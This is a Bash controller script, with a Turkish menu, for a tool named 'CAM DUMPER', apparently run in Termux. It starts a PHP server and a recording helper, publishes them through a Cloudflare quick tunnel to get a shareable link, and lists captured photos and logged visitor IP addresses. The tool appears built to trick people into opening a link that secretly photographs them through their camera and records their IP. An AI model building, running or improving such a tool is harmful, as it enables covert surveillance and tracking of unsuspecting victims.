#!/bin/bash

YESIL='\033[0;32m'
LACIVERT='\033[0;34m'
BEYAZ='\033[1;37m'
KIRMIZI='\033[0;31m'
SARI='\033[1;33m'
RENK_YOK='\033[0m'

ascii_art="
${LACIVERT}    ╔═══════════════════════════════════════╗
    ║   ${YESIL}██████╗  █████╗ ███╗   ███╗${LACIVERT}     ║
    ║   ${YESIL}██╔════╝ ██╔══██╗████╗ ████║${LACIVERT}     ║
    ║   ${YESIL}██║      ███████║██╔████╔██║${LACIVERT}     ║
    ║   ${YESIL}██║      ██╔══██║██║╚██╔╝██║${LACIVERT}     ║
    ║   ${YESIL}╚██████╗ ██║  ██║██║ ╚═╝ ██║${LACIVERT}     ║
    ║   ${YESIL} ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝${LACIVERT}     ║
    ║   ${YESIL}     C A M   D U M P E R${LACIVERT}        ║
    ╚═══════════════════════════════════════╝
${RENK_YOK}"

menu() {
    clear
    echo -e "$ascii_art"
    echo ""
    echo -e "${YESIL}[1]${LACIVERT} 🚀 Siteyi Başlat${RENK_YOK}"
    echo -e "${YESIL}[2]${LACIVERT} 🔗 Link Al${RENK_YOK}"
    echo -e "${YESIL}[3]${LACIVERT} 🛑 Siteyi Durdur${RENK_YOK}"
    echo -e "${YESIL}[4]${LACIVERT} 📸 Fotoğrafları Listele${RENK_YOK}"
    echo -e "${YESIL}[5]${LACIVERT} 📍 IP Kayıtlarını Göster${RENK_YOK}"
    echo -e "${YESIL}[6]${LACIVERT} 📊 Durum Kontrol${RENK_YOK}"
    echo -e "${KIRMIZI}[7]${LACIVERT} ❌ Çıkış${RENK_YOK}"
    echo ""
    echo -e "${LACIVERT}➜ Seçim: ${RENK_YOK}"
    read secim
}

# ==================== BAŞLAT ====================
start_services() {
    clear
    echo -e "${SARI}[!] Servisler başlatılıyor...${RENK_YOK}"
    
    mkdir -p ~/CAM-DUMPER/captured_files
    mkdir -p ~/storage/shared/DCIM/Camera/
    mkdir -p ~/storage/shared/Pictures/CamDumper/
    
    touch ~/CAM-DUMPER/captured_files/ip.txt
    > ~/CAM-DUMPER/captured_files/ip.txt
    rm -f ~/CAM-DUMPER/captured_files/*.png
    
    echo -e "${YESIL}[✓] ip.txt oluşturuldu ve eski kayıtlar temizlendi.${RENK_YOK}"
    
    cd ~/CAM-DUMPER
    php -S 0.0.0.0:8080 > /dev/null 2>&1 &
    PHP_PID=$!
    echo -e "${YESIL}[✓] PHP sunucusu başlatıldı (PID: $PHP_PID)${RENK_YOK}"
    
    nohup ./record.sh > /dev/null 2>&1 &
    RECORD_PID=$!
    echo -e "${YESIL}[✓] record.sh başlatıldı (PID: $RECORD_PID)${RENK_YOK}"
    
    echo ""
    echo -e "${YESIL}[✓] Sistem hazır!${RENK_YOK}"
    echo -e "${LACIVERT}[+] Menüden [2] Link Al seçeneğiyle link alabilirsin.${RENK_YOK}"
    echo ""
    read -p "Menüye dönmek için Enter'a bas..."
}

# ==================== LİNK AL ====================
get_link() {
    clear
    echo -e "${SARI}[!] Cloudflared başlatılıyor...${RENK_YOK}"
    
    # Cloudflared'i arka planda başlat ve linki yakala
    cloudflared tunnel --url http://localhost:8080 --no-autoupdate 2>&1 | while read line; do
        if [[ $line == *"https://"* ]]; then
            link=$(echo "$line" | grep -o 'https://[^ ]*trycloudflare.com')
            echo -e "${YESIL}🔗 Linkiniz: ${BEYAZ}$link${RENK_YOK}"
            echo "$link" > ~/CAM-DUMPER/link.txt
            echo -e "${LACIVERT}[!] Link kaydedildi: ~/CAM-DUMPER/link.txt${RENK_YOK}"
        fi
    done &
    
    CLOUD_PID=$!
    echo -e "${YESIL}[✓] Cloudflared arka planda çalışıyor (PID: $CLOUD_PID)${RENK_YOK}"
    echo -e "${LACIVERT}[!] Link gelmesi 5-10 saniye sürebilir...${RENK_YOK}"
    echo ""
    sleep 8
    
    if [ -f ~/CAM-DUMPER/link.txt ]; then
        link=$(cat ~/CAM-DUMPER/link.txt)
        echo -e "${YESIL}🔗 Linkiniz: ${BEYAZ}$link${RENK_YOK}"
    else
        echo -e "${KIRMIZI}❌ Link alınamadı! Tekrar dene.${RENK_YOK}"
    fi
    
    echo ""
    read -p "Menüye dönmek için Enter'a bas..."
}

# ==================== DURDUR ====================
stop_services() {
    clear
    echo -e "${KIRMIZI}[!] Tüm servisler durduruluyor...${RENK_YOK}"
    
    pkill php 2>/dev/null
    pkill -f record.sh 2>/dev/null
    pkill cloudflared 2>/dev/null
    pkill -f "cloudflared tunnel" 2>/dev/null
    
    echo -e "${YESIL}[✓] PHP durduruldu${RENK_YOK}"
    echo -e "${YESIL}[✓] record.sh durduruldu${RENK_YOK}"
    echo -e "${YESIL}[✓] Cloudflared durduruldu${RENK_YOK}"
    echo ""
    read -p "Menüye dönmek için Enter'a bas..."
}

# ==================== FOTOĞRAF LİSTELE ====================
list_photos() {
    clear
    echo -e "${LACIVERT}📸 Kaydedilen Fotoğraflar:${RENK_YOK}"
    echo -e "${BEYAZ}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RENK_YOK}"
    
    if [ -d ~/storage/shared/DCIM/Camera ] && [ "$(ls -A ~/storage/shared/DCIM/Camera/*.png 2>/dev/null)" ]; then
        ls -lh ~/storage/shared/DCIM/Camera/*.png 2>/dev/null | awk '{print "📷 " $9 " (" $5 ")"}'
        echo ""
        echo -e "${YESIL}Toplam: $(ls -1 ~/storage/shared/DCIM/Camera/*.png 2>/dev/null | wc -l) fotoğraf${RENK_YOK}"
    else
        echo -e "${KIRMIZI}Henüz fotoğraf yok!${RENK_YOK}"
    fi
    echo ""
    read -p "Menüye dönmek için Enter'a bas..."
}

# ==================== IP GÖSTER ====================
show_ips() {
    clear
    echo -e "${LACIVERT}📍 IP Kayıtları:${RENK_YOK}"
    echo -e "${BEYAZ}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RENK_YOK}"
    
    if [ -f ~/CAM-DUMPER/captured_files/ip.txt ]; then
        cat ~/CAM-DUMPER/captured_files/ip.txt
        echo ""
        echo -e "${YESIL}Toplam: $(wc -l < ~/CAM-DUMPER/captured_files/ip.txt) kayıt${RENK_YOK}"
    else
        echo -e "${KIRMIZI}ip.txt dosyası bulunamadı!${RENK_YOK}"
    fi
    echo ""
    read -p "Menüye dönmek için Enter'a bas..."
}

# ==================== DURUM KONTROL ====================
status_check() {
    clear
    echo -e "${LACIVERT}📊 Sistem Durumu:${RENK_YOK}"
    echo -e "${BEYAZ}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RENK_YOK}"
    
    if pgrep php > /dev/null; then
        echo -e "${YESIL}[✓] PHP: Çalışıyor (PID: $(pgrep php))${RENK_YOK}"
    else
        echo -e "${KIRMIZI}[✗] PHP: Çalışmıyor${RENK_YOK}"
    fi
    
    if pgrep -f record.sh > /dev/null; then
        echo -e "${YESIL}[✓] record.sh: Çalışıyor (PID: $(pgrep -f record.sh))${RENK_YOK}"
    else
        echo -e "${KIRMIZI}[✗] record.sh: Çalışmıyor${RENK_YOK}"
    fi
    
    if pgrep cloudflared > /dev/null; then
        echo -e "${YESIL}[✓] Cloudflared: Çalışıyor (PID: $(pgrep cloudflared))${RENK_YOK}"
    else
        echo -e "${KIRMIZI}[✗] Cloudflared: Çalışmıyor${RENK_YOK}"
    fi
    
    echo ""
    foto_sayisi=$(ls -1 ~/storage/shared/DCIM/Camera/*.png 2>/dev/null | wc -l)
    echo -e "${LACIVERT}📸 Toplam Fotoğraf: ${BEYAZ}$foto_sayisi${RENK_YOK}"
    
    if [ -f ~/CAM-DUMPER/captured_files/ip.txt ]; then
        ip_sayisi=$(wc -l < ~/CAM-DUMPER/captured_files/ip.txt)
        echo -e "${LACIVERT}📍 Toplam IP: ${BEYAZ}$ip_sayisi${RENK_YOK}"
    fi
    
    echo ""
    read -p "Menüye dönmek için Enter'a bas..."
}

# ==================== ANA PROGRAM ====================
while true; do
    menu
    case $secim in
        1) start_services ;;
        2) get_link ;;
        3) stop_services ;;
        4) list_photos ;;
        5) show_ips ;;
        6) status_check ;;
        7) 
            echo -e "${LACIVERT}👋 Çıkılıyor...${RENK_YOK}"
            pkill php 2>/dev/null
            pkill -f record.sh 2>/dev/null
            pkill cloudflared 2>/dev/null
            exit 0
            ;;
        *)
            echo -e "${KIRMIZI}❌ Geçersiz seçim!${RENK_YOK}"
            sleep 2
            ;;
    esac
done
